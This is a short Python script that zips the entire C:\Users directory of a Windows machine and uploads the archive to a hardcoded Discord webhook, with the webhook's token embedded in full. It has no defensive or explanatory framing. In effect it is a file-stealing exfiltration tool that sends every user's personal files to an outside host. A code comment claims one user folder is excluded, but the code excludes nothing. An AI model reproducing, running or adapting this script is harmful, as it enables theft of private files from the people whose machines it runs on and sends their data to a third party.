import os
import zipfile
import requests

def zip_folder(folder_path, zip_filename):
    # Create a zip file containing all the files in the folder
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))
    print(f"Folder zipped successfully: {zip_filename}")

def upload_to_discord(file_path, webhook_url):
    # Upload the file to Discord
    with open(file_path, 'rb') as file:
        response = requests.post(webhook_url, files={"file": file})
    return response.status_code

if __name__ == "__main__":
    # Set the webhook URL
    webhook_url = "https://discord.com/api/webhooks/1323437243238580255/hO8hxJ-sl9GxAdGwr8M6GqGAN3I3yLp8Jh7Vng42FjOVCbM4_vz2PuBkUAl9fZ8cGuGo"
    
    # Define the folder to scan (inside C:\Users, excluding the 'zachk' folder)
    folder_to_zip = r"C:\Users"
    
    # Define the name for the zip file
    zip_filename = "users_folder.zip"
    
    print("Zipping the folder...")
    zip_folder(folder_to_zip, zip_filename)
    
    # Upload the zip file to Discord
    print(f"Uploading {zip_filename}...")
    status = upload_to_discord(zip_filename, webhook_url)
    print(f"Upload status: {status}")
